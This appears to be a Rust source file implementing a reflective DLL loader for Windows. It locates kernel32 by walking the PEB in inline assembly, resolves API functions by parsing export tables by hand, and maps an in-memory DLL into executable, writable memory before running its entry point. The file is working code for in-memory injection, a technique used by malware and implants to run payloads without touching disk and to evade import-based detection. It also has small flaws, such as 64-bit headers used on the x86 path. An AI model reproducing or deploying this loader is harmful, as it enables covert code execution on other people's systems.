use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::System::SystemServices::*;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::Diagnostics::Debug::*;

#[no_mangle]
#[allow(non_snake_case)]
pub unsafe extern "system" fn DllMain(
    _h_module: isize,
    reason: u32,
    _reserved: *mut std::ffi::c_void,
) -> BOOL {
    if reason == DLL_PROCESS_ATTACH {
    }
    1
}

#[repr(C)]
#[allow(non_snake_case)]
pub struct IMAGE_NT_HEADERS64 {
    pub Signature: u32,
    pub FileHeader: windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER,
    pub OptionalHeader: windows_sys::Win32::System::Diagnostics::Debug::IMAGE_OPTIONAL_HEADER64,
}

// Minimal PEB definitions to find kernel32
#[repr(C)]
#[allow(non_snake_case)]
pub struct PEB_LDR_DATA {
    pub Length: u32,
    pub Initialized: u8,
    pub SsHandle: *mut std::ffi::c_void,
    pub InLoadOrderModuleList: LIST_ENTRY,
    pub InMemoryOrderModuleList: LIST_ENTRY,
    pub InInitializationOrderModuleList: LIST_ENTRY,
}

#[repr(C)]
#[allow(non_snake_case)]
pub struct LDR_DATA_TABLE_ENTRY {
    pub InLoadOrderLinks: LIST_ENTRY,
    pub InMemoryOrderLinks: LIST_ENTRY,
    pub u1: [usize; 2],
    pub DllBase: *mut std::ffi::c_void,
    pub EntryPoint: *mut std::ffi::c_void,
    pub SizeOfImage: u32,
    pub FullDllName: UNICODE_STRING,
    pub BaseDllName: UNICODE_STRING,
}

#[repr(C)]
#[allow(non_snake_case)]
pub struct UNICODE_STRING {
    pub Length: u16,
    pub MaximumLength: u16,
    pub Buffer: *mut u16,
}

#[repr(C)]
#[allow(non_snake_case)]
pub struct LIST_ENTRY {
    pub Flink: *mut LIST_ENTRY,
    pub Blink: *mut LIST_ENTRY,
}

// Define the function types we need
type VirtualAllocFn = unsafe extern "system" fn(*const std::ffi::c_void, usize, u32, u32) -> *mut std::ffi::c_void;
type LoadLibraryAFn = unsafe extern "system" fn(*const u8) -> isize;
type GetProcAddressFn = unsafe extern "system" fn(isize, *const u8) -> Option<unsafe extern "system" fn() -> isize>;

unsafe fn get_kernel32_base() -> usize {
    let peb_ptr: usize;
    let ldr_offset: usize;

    #[cfg(target_arch = "x86_64")]
    {
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb_ptr);
        ldr_offset = 0x18;
    }
    #[cfg(target_arch = "x86")]
    {
        std::arch::asm!("mov {}, fs:[0x30]", out(reg) peb_ptr);
        ldr_offset = 0x0c;
    }

    let ldr = *( (peb_ptr + ldr_offset) as *const *mut PEB_LDR_DATA );
    let module_list = &mut (*ldr).InLoadOrderModuleList as *mut LIST_ENTRY;
    let mut current_entry = (*module_list).Flink;

    while current_entry != module_list {
        let entry = current_entry as *const LDR_DATA_TABLE_ENTRY;
        let dll_name = (*entry).BaseDllName.Buffer;
        let dll_len = (*entry).BaseDllName.Length as usize / 2;

        if dll_len >= 8 {
            let name_slice = std::slice::from_raw_parts(dll_name, dll_len);
            // "kernel32.dll" in UTF-16
            let k32 = ['k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, '3' as u16, '2' as u16];
            let mut match_found = true;
            for i in 0..8 {
                let mut c = name_slice[i];
                if c >= 'A' as u16 && c <= 'Z' as u16 {
                    c += 32;
                }
                if c != k32[i] {
                    match_found = false;
                    break;
                }
            }
            if match_found {
                return (*entry).DllBase as usize;
            }
        }
        current_entry = (*current_entry).Flink;
    }
    0
}

unsafe fn get_proc_address_raw(module_base: usize, func_name: &str) -> usize {
    let dos_header = module_base as *const IMAGE_DOS_HEADER;
    let nt_headers = (module_base + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress;
    let export_dir = (module_base + export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;

    let names_rva = (*export_dir).AddressOfNames;
    let funcs_rva = (*export_dir).AddressOfFunctions;
    let ordinals_rva = (*export_dir).AddressOfNameOrdinals;

    let names = (module_base + names_rva as usize) as *const u32;
    let funcs = (module_base + funcs_rva as usize) as *const u32;
    let ordinals = (module_base + ordinals_rva as usize) as *const u16;

    for i in 0..(*export_dir).NumberOfNames {
        let name_ptr = (module_base + *names.add(i as usize) as usize) as *const i8;
        let mut len = 0;
        while *name_ptr.add(len) != 0 { len += 1; }
        let name = std::str::from_utf8_unchecked(std::slice::from_raw_parts(name_ptr as *const u8, len));

        if name == func_name {
            let ordinal = *ordinals.add(i as usize);
            return module_base + *funcs.add(ordinal as usize) as usize;
        }
    }
    0
}

#[no_mangle]
pub unsafe extern "C" fn ReflectiveLoader(lp_parameter: *mut std::ffi::c_void) {
    let raw_dll = lp_parameter as *const u8;

    // 0. Resolve core functions from kernel32.dll
    let k32_base = get_kernel32_base();
    if k32_base == 0 { return; }

    let virtual_alloc: VirtualAllocFn = std::mem::transmute(get_proc_address_raw(k32_base, "VirtualAlloc"));
    let load_library_a: LoadLibraryAFn = std::mem::transmute(get_proc_address_raw(k32_base, "LoadLibraryA"));
    let get_proc_address: GetProcAddressFn = std::mem::transmute(get_proc_address_raw(k32_base, "GetProcAddress"));

    // 1. Parse PE Headers from raw DLL
    let dos_header = raw_dll as *const IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        return;
    }

    let nt_headers_ptr = (raw_dll as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;

    // 2. Allocate memory for properly mapped image
    let image_size = (*nt_headers_ptr).OptionalHeader.SizeOfImage as usize;
    let mapped_image = virtual_alloc(
        std::ptr::null(),
        image_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );

    if mapped_image.is_null() {
        return;
    }

    // 3. Copy Headers
    let size_of_headers = (*nt_headers_ptr).OptionalHeader.SizeOfHeaders as usize;
    std::ptr::copy_nonoverlapping(raw_dll, mapped_image as *mut u8, size_of_headers);

    // 4. Copy Sections
    let section_header_ptr = (nt_headers_ptr as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
    let num_sections = (*nt_headers_ptr).FileHeader.NumberOfSections as usize;

    for i in 0..num_sections {
        let section = *section_header_ptr.add(i);
        let dst = (mapped_image as usize + section.VirtualAddress as usize) as *mut u8;
        let src = (raw_dll as usize + section.PointerToRawData as usize) as *const u8;
        let size = section.SizeOfRawData as usize;

        if size > 0 {
            std::ptr::copy_nonoverlapping(src, dst, size);
        }
    }

    // 5. Resolve Imports
    let import_dir = (*nt_headers_ptr).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if import_dir.Size > 0 {
        let mut import_desc = (mapped_image as usize + import_dir.VirtualAddress as usize) as *const IMAGE_IMPORT_DESCRIPTOR;

        while (*import_desc).FirstThunk != 0 {
            let module_name_ptr = (mapped_image as usize + (*import_desc).Name as usize) as *const i8;
            let module_handle = load_library_a(module_name_ptr as *const u8);

            if module_handle != 0 {
                let mut thunk_data = (mapped_image as usize + (*import_desc).FirstThunk as usize) as *mut usize;
                let mut original_thunk_data = if (*import_desc).Anonymous.OriginalFirstThunk != 0 {
                    (mapped_image as usize + (*import_desc).Anonymous.OriginalFirstThunk as usize) as *const usize
                } else {
                    thunk_data as *const usize
                };

                while *original_thunk_data != 0 {
                    if *original_thunk_data & (1usize << (std::mem::size_of::<usize>() * 8 - 1)) != 0 {
                        let ordinal = (*original_thunk_data & 0xFFFF) as *const u8;
                        if let Some(func_ptr) = get_proc_address(module_handle, ordinal) {
                             *thunk_data = func_ptr as usize;
                        }
                    } else {
                        let import_by_name = (mapped_image as usize + *original_thunk_data) as *const IMAGE_IMPORT_BY_NAME;
                        let func_name = (*import_by_name).Name.as_ptr();
                        if let Some(func_ptr) = get_proc_address(module_handle, func_name) {
                             *thunk_data = func_ptr as usize;
                        }
                    }

                    thunk_data = thunk_data.add(1);
                    original_thunk_data = original_thunk_data.add(1);
                }
            }
            import_desc = import_desc.add(1);
        }
    }

    // 6. Perform Relocations
    let delta = mapped_image as isize - (*nt_headers_ptr).OptionalHeader.ImageBase as isize;
    if delta != 0 {
        let reloc_dir = (*nt_headers_ptr).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
        if reloc_dir.Size > 0 {
            let mut reloc_block = (mapped_image as usize + reloc_dir.VirtualAddress as usize) as *const IMAGE_BASE_RELOCATION;

            while (*reloc_block).SizeOfBlock > 0 {
                let count = ((*reloc_block).SizeOfBlock as usize - std::mem::size_of::<IMAGE_BASE_RELOCATION>()) / 2;
                let entry_ptr = (reloc_block as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>()) as *const u16;

                for i in 0..count {
                    let entry = *entry_ptr.add(i);
                    let type_ = entry >> 12;
                    let offset = (entry & 0xFFF) as usize;

                    if type_ == IMAGE_REL_BASED_DIR64 as u16 {
                        let patch_addr = (mapped_image as usize + (*reloc_block).VirtualAddress as usize + offset) as *mut usize;
                        *patch_addr = (*patch_addr as isize + delta) as usize;
                    }
                }

                reloc_block = (reloc_block as usize + (*reloc_block).SizeOfBlock as usize) as *const IMAGE_BASE_RELOCATION;
            }
        }
    }

    // 7. Execute DllMain
    let dll_main_addr = (mapped_image as usize + (*nt_headers_ptr).OptionalHeader.AddressOfEntryPoint as usize) as usize;
    let dll_main: unsafe extern "system" fn(isize, u32, *mut std::ffi::c_void) -> BOOL = std::mem::transmute(dll_main_addr);
    dll_main(mapped_image as isize, DLL_PROCESS_ATTACH, std::ptr::null_mut());
}
